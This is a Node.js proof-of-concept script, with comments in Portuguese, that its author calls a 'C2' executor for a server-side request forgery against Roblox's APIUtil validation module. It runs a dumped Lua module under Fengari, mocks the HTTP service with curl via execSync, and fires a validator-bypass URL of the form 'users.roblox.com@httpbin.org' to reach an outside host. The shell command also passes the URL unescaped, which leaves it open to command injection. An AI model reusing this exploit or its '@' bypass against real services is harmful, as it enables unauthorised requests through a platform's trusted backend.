// language: JavaScript, target: Node.js
// @author: Ratman4080
// @description: Executor C2 Server-Side para APIUtil SSRF.

const readline = require('readline');
const chalk = require('chalk');
const { execSync } = require('child_process');
const { lua, lauxlib, lualib, to_luastring, to_jsstring } = require('fengari');

// ============================================================================
// 1. LOGGER E UI
// ============================================================================

const log = {
    info: (msg) => console.log(chalk.blue('[INFO]') + ' ' + msg),
    pass: (msg) => console.log(chalk.green('[PASS]') + ' ' + msg),
    warn: (msg) => console.log(chalk.yellow('[WARN]') + ' ' + msg),
    fail: (msg) => console.log(chalk.red('[FAIL]') + ' ' + msg),
    raw: (msg) => console.log(msg)
};

const banner = `
======================================================
  RATMAN4080 SERVER-SIDE EXECUTOR V1.1
  Target: APIUtil (CorePackages.UGCValidation)
  Engine: Node.js + Fengari (Lua 5.3)
======================================================
`;

// ============================================================================
// 2. CÓDIGO LUA ADAPTADO PARA FENGARI (LUA 5.3)
// ============================================================================

// Nota: O `..=` e o `if X then Y else Z` do Luau foram traduzidos para Lua puro.
const luaSource = `
local HttpRbxApiService = game:GetService("HttpRbxApiService")
local ContentProvider = game:GetService("ContentProvider")
local t1 = {}

function t1.getBaseDomain()
    local BaseUrl = ContentProvider.BaseUrl
    if string.sub(BaseUrl, #BaseUrl) ~= "/" then 
        BaseUrl = BaseUrl .. "/" 
    end
    local _, v2 = string.find(BaseUrl, "://")
    local _, v3 = string.find(BaseUrl, "%.", v2 + 1)
    return string.sub(BaseUrl, v3 + 1)
end

local function requestAndRetry(p1, p2)
    local v5 = 0
    if p2 ~= nil then v5 = p2 end
    
    local ok, result = pcall(p1)
    if ok then return true, result end
    if v5 >= 2 then return false, result end
    
    local v6 = 2 ^ (v5 - 1)
    wait(v6)
    return requestAndRetry(p1, v5 + 1)
end

function t1.requestAndRetryGet(p5)
    return requestAndRetry(function()
        return HttpRbxApiService:GetAsyncFullUrl(p5)
    end)
end

return t1
`;

// ============================================================================
// 3. IMPLEMENTAÇÃO DO HTTPRbxApiService SÍNCRONO
// ============================================================================

// Usamos child_process (curl) para fazer a request HTTP de forma síncrona, 
// permitindo que o interpretador Lua do Fengari aguarde o retorno.
function syncHttpRequest(url) {
    log.info(`Requisitando: ${chalk.gray(url)}`);
    try {
        // -s (silent), -i (include headers), -L (follow redirects), --max-time 10
        const cmd = `curl -s -i -L --max-time 10 -H "User-Agent: Roblox/WinInet" "${url}"`;
        const result = execSync(cmd, { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'ignore'] });
        
        // Extrair o status code do header HTTP
        const statusMatch = result.match(/HTTP\/\d\.\d\s+(\d+)/);
        if (statusMatch) {
            const status = parseInt(statusMatch[1]);
            if (status === 200) log.pass(`Status ${status} OK`);
            else if (status === 401) log.warn(`Status ${status} Unauthorized`);
            else log.warn(`Status ${status}`);
        }
        return result.substring(0, 500); // Retorna os primeiros 500 chars (headers + body)
    } catch (e) {
        log.fail(`Erro na requisição: ${e.message}`);
        return "HTTP_ERROR";
    }
}

// ============================================================================
// 4. MOTOR LUA (FENGARI) E SANDBOX
// ============================================================================

const L = lauxlib.luaL_newstate();
lualib.luaL_openlibs(L);

function setupLuaEnvironment() {
    lua.lua_register(L, 'get_service', (state) => {
        const serviceName = lua.lua_tostring(state, 1);
        lua.lua_newtable(state);

        if (to_jsstring(serviceName) === 'HttpRbxApiService') {
            lua.lua_pushcfunction(state, (s) => {
                const url = lua.lua_tostring(s, 1);
                const response = syncHttpRequest(to_jsstring(url));
                lua.lua_pushstring(s, to_luastring(response));
                return 1;
            });
            lua.lua_setfield(state, -2, to_luastring('GetAsyncFullUrl'));
        }

        if (to_jsstring(serviceName) === 'ContentProvider') {
            lua.lua_pushstring(state, to_luastring('https://www.roblox.com/'));
            lua.lua_setfield(state, -2, to_luastring('BaseUrl'));
        }

        return 1;
    });

    lua.lua_newtable(L);
    lua.lua_pushcfunction(L, (state) => {
        const service = lua.lua_tostring(state, 1);
        lua.lua_getglobal(state, to_luastring('get_service'));
        lua.lua_pushstring(state, service);
        lua.lua_call(state, 1, 1);
        return 1;
    });
    lua.lua_setfield(L, -2, to_luastring('GetService'));
    lua.lua_setglobal(L, to_luastring('game'));

    lua.lua_register(L, 'wait', (state) => {
        const time = lua.lua_tonumber(state, 1);
        log.info(`Wait de ${time}s solicitado pelo Lua.`);
        lua.lua_pushboolean(state, 1);
        return 1;
    });
}

// ============================================================================
// 5. EXECUÇÃO DO SSRF
// ============================================================================

function executarSSRF() {
    log.info('Carregando o interpretador Lua (Fengari)...');

    const loadResult = lauxlib.luaL_loadstring(L, to_luastring(luaSource));
    if (loadResult !== lua.LUA_OK) {
        const error = lua.lua_tostring(L, -1);
        log.fail(`Erro na compilação do Lua: ${to_jsstring(error)}`);
        return;
    }

    setupLuaEnvironment();

    log.info('Executando o dump Lua no Node.js...');
    const status = lua.lua_pcall(L, 0, 1, 0);

    if (status !== lua.LUA_OK) {
        const error = lua.lua_tostring(L, -1);
        log.fail(`Erro na execução do Lua: ${to_jsstring(error)}`);
        return;
    }

    log.pass('Dump Lua executado com sucesso!');

    if (lua.lua_istable(L, -1)) {
        log.info('Tabela t1 retornada. Invocando requestAndRetryGet...');

        lua.lua_getfield(L, -1, to_luastring('requestAndRetryGet'));
        if (lua.lua_isfunction(L, -1)) {
            // URL com Bypass de Validador (@)
            const targetUrl = 'https://users.roblox.com@httpbin.org/status/200';
            lua.lua_pushstring(L, to_luastring(targetUrl));

            const callStatus = lua.lua_pcall(L, 1, 2, 0);
            if (callStatus === lua.LUA_OK) {
                const success = lua.lua_toboolean(L, -2);
                const result = lua.lua_tostring(L, -1);
                log.pass(`Resultado do SSRF: Sucesso=${success === 1 ? 'true' : 'false'}`);
                log.raw(chalk.gray('--------------------------------------------------'));
                log.raw(to_jsstring(result));
                log.raw(chalk.gray('--------------------------------------------------'));
            } else {
                log.fail('Erro ao chamar requestAndRetryGet.');
            }
        } else {
            log.fail('Função requestAndRetryGet não encontrada.');
        }
    }
}

// ============================================================================
// 6. INTERFACE DO USUÁRIO
// ============================================================================

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: chalk.cyan('ssrf@server:~# ')
});

function boot() {
    console.clear();
    console.log(chalk.red(banner));
    log.info("Digite 'help' para ver os comandos.");
    rl.prompt();

    rl.on('line', (line) => {
        const cmd = line.trim().toLowerCase();
        switch (cmd) {
            case 'help':
                log.info('Comandos disponíveis:');
                log.info('  run   - Executa o SSRF via Lua no Node.js');
                log.info('  exit  - Sai do executor');
                break;
            case 'run':
                executarSSRF();
                break;
            case 'exit':
                log.info('Encerrando...');
                process.exit(0);
                break;
            default:
                if (cmd.length > 0) log.warn(`Comando não reconhecido: ${cmd}`);
        }
        rl.prompt();
    });
}

boot();
